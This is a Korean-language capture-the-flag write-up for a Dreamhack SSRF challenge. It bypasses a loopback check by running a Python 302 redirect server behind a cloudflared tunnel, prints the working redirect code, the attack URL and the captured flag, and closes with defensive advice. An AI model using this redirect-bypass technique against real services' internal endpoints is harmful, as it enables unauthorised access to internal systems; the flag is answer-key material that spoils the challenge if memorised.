---
title: crawling
date: 2026-07-14
draft: false
ShowToc: true
tags:
  - Writeup
  - Dreamhack
  - SSRF
---

## 승리 조건
- `/admin`은 `remote_addr == '127.0.0.1'`일 때만 flag 반환
```python
@app.route('/admin')
def admin_page():
    if request.remote_addr != '127.0.0.1':
        return "This is local page!"
    return app.flag
```
- 내가 직접 접속 → 내 IP 찍힘 → 불가
- 서버가 자기 자신에게 `/admin`을 요청하도록 유도해야 함 = SSRF

## 진행

### 1. 입력 지점 → 싱크 찾기
- `/validation`이 url 파라미터 받아 `check_get(url)` 실행, 결과를 화면에 렌더
- `check_get` 안에서 `requests.get(url)` 발견 → 서버가 요청 쏘는 지점(SSRF sink)

### 2. 순진하게 넣어보니 막힘
- `?url=http://127.0.0.1:3333/admin` → 화면에 "Can you access my admin page~?"
- 원인: resolve한 IP가 loopback이라 `check_global` False
```python
res = requests.get(url)
if check_global(ip) == False:      # 전역 IP 아니면 차단
    return "Can you access my admin page~?"
```
- 모순 발견: 검증은 전역 IP를 요구, 근데 나는 127.0.0.1에 도달해야 함

### 3. 우회 아이디어
- 검증될 때까진 전역 주소(내 서버)로 통과 → 그 이후 admin이 localhost로 들어가게
- 메커니즘 = HTTP 리다이렉트. `requests.get`은 302를 자동으로 따라가지만 검증은 안 그럼
- 검증한 주소(전역) ≠ 최종 도달 주소(127.0.0.1)로 분리시키는 것

### 4. 공개 리다이렉트 서비스 시도 → 전부 실패
- webhook.site: 302는 되는데 무료판에 Location 헤더 넣는 칸이 없음 → 목적지 지정 불가
- httpbin.org/redirect-to: 503 다운
- httpbingo.org/redirect-to: 살아있지만 리다이렉트 목적지 화이트리스트 존재
```
Forbidden redirect URL. Allowed: example.com/net/org, httpbingo.org
```
- 결론: 아무 데로나 302 안 해주는 서비스뿐 → 자체 서버 필요

### 5. 자체 리다이렉트 서버 + 공인 터널
- 리다이렉트 서버 (파이썬 표준 라이브러리)
```python
# redir.py
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://127.0.0.1:3333/admin')
        self.end_headers()
HTTPServer(('0.0.0.0', 5001), H).serve_forever()
```
- 원격 인스턴스가 닿게 공인 노출 (5000은 macOS AirPlay 점유 → 5001 사용)
```bash
cloudflared tunnel --url http://localhost:5001
# → https://xxxx.trycloudflare.com
```
- 공격
```
http://<host>/validation?url=https://xxxx.trycloudflare.com/
```

### 6. 성공
- IP 자리에 Cloudflare 전역 IP(104.16.x.x) 찍힘 → `check_global` 통과 → 302 따라가 admin 도달
```
DH{d881f7e8ef64f32224a4db6d6764466a}
```

## 배운 점
- SSRF 필터 우회 = 검증 시점과 실제 요청 시점의 불일치(TOCTOU)를 노림
- 여기선 `check_global`이 URL 호스트 IP만 보고, `requests.get`은 리다이렉트를 따라가는 비대칭
- 리다이렉트 우회는 공인 리다이렉트 서버가 필요 → 공개 서비스가 대부분 사설IP 목적지를 막으니 자체 구동 + 터널이 현실적
- 방어: `allow_redirects=False` + 수동 검증, resolve한 IP로 직접 연결(호스트 재신뢰 금지), 화이트리스트 대역